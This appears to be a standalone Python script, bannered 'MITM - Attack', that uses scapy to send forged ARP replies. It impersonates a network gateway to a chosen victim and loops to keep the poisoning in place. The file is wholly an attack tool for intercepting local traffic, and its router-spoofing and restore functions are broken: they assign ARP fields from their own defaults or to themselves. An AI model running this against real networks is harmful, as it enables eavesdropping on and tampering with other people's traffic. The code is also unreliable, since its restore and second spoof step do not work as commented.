#! /usr/bin/python

from scapy.all import *
import time
import pyfiglet
import termcolor

banner = "MITM - Attack"
print(termcolor.colored(pyfiglet.figlet_format(banner), color="red", attrs=["bold"]))

# Pretending to be a router
def spoof_victim():
    arp_response = ARP()
    arp_response.op = 2
    arp_response.pdst = input(termcolor.colored("[+] Enter the target IP address: ", color="green", attrs=["bold"]))
    arp_response.hwdst = input(termcolor.colored("[+] Enter the target MAC address: ", color="green", attrs=["bold"]))
    print(termcolor.colored("=" * 50, color="white", attrs=["bold"]))
    arp_response.hwsrc = input(termcolor.colored("[+] Enter your MAC address: ", color="green", attrs=["bold"]))
    arp_response.psrc = input(termcolor.colored("[+] Enter the gateway IP address: ", color="green", attrs=["bold"]))
    print(termcolor.colored("=" * 50, color="white", attrs=["bold"]))
    send(arp_response)

# Pretending to be device A
def spoof_router():
    arp_response = ARP()
    arp_response.op = 2
    arp_response.pdst = arp_response.psrc
    arp_response.hwdst = input(termcolor.colored("[+] Enter the gateway MAC address: ", color="green", attrs=["bold"]))
    arp_response.hwsrc = arp_response.hwsrc
    arp_response.psrc = arp_response.pdst
    send(arp_response)

# restore router & windows tables
def restore():
    # restoring router table
    arp_response = ARP()
    arp_response.op = 2
    arp_response.pdst =  arp_response.psrc
    arp_response.hwdst = arp_response.hwdst
    arp_response.hwsrc = arp_response.hwdst
    arp_response.psrc = arp_response.pdst
    send(arp_response)

    #restoring windows table
    arp_response = ARP()
    arp_response.op = 2
    arp_response.pdst = arp_response.pdst
    arp_response.hwdst = arp_response.hwdst
    arp_response.hwsrc = arp_response.hwdst
    arp_response.psrc = arp_response.psrc
    send(arp_response)


if __name__ == "__main__":
    try:
        while True:
            spoof_victim()
            spoof_router()
            time.sleep(2)

    except KeyboardInterrupt as err:
        print(termcolor.colored("[+] restoring ARP", color="yellow", attrs=["bold"]))
        restore()
        print(termcolor.colored("[!] Exiting...", color="red", attrs=["bold"]))
